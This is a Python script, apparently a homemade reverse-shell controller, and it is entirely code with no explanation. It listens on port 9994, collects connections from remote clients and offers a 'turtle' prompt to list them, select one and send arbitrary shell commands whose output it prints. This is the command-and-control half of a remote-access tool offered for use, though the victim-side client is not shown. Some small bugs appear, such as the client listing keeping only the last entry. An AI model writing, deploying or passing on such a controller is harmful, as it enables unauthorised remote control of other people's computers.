import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS =2
JOB_NUMBER = [1, 2]
queue= Queue()
all_connections = []
all_address = []



def create_socket():
    try:
       global host
       global port 
       global s 

       host=""
       port = 9994

       s = socket.socket()

    except socket.error as msg:
        print("Socket Creation error msg is "+str(msg))

#Binding the socket qand listening to connection 
def bind_socket():
    try:
       global host
       global port 
       global s 

       print("The binding port is "+str(port))

       s.bind((host,port))
       s.listen(5)


    except socket.error as msg:
        print("Socket Creation error msg is "+str(msg) + "\n"+"Trying......")   
        bind_socket()


# Handling connection from multiple clients and saving in a list
# closing previous server connections when file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            print("Connection is estabilished with address "+ address[0])


        except :
            print("Error accepting connection")    



#2 nd thread functions 1)see all the clients )select a client 3)  Send command to cannected client 
#Interactive prompt for selecting a command

def start_turtle():

  while True:  
    cmd = input("turtle ")

    if cmd=="list":
        list_connctions()

    elif "select" in cmd:
        conn = get_target(cmd)
        if conn is not None:
            sent_target_commands(conn)

    else:
        print("Command not registered")   



#Display all current active connections with the client


def list_connctions():
    results=""

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))

            conn.recv(201480)

        except :
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i)+" "+str(all_address[i][0])+" "+str(all_address[i][1])+"\n"


    print("-----------Clients-----------"+"\n"+results)


#selecting the target
def get_target(cmd):
    try:
        target = cmd.replace("select","")        
        target=int(target)

        conn=all_connections[target]

        print("You are now connected to"+str(all_address[target][0]))
        print(str(all_address[target][0]) + ">","")
        return conn

    except:
        print("Selection is not valid")
        return None


def sent_target_commands(conn):
    while True:
        try: 
           cmd = input()
           if cmd =='quit':
               break  

           if len(str.encode(cmd)) >0:
               conn.send(str.encode(cmd))   
               client_response = str(conn.recv(20480),"utf-8")
               print(client_response,"")



        except:
           print("Error sending commands")  
           break



def create_workers():        

    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()


#Do next job that is in the queue (handle connections and send commands)
def work():

    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()

            accepting_connection()

        if x==2:
            start_turtle()


        queue.task_done()




def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)


    queue.join()




create_workers()
create_jobs()        
 
               



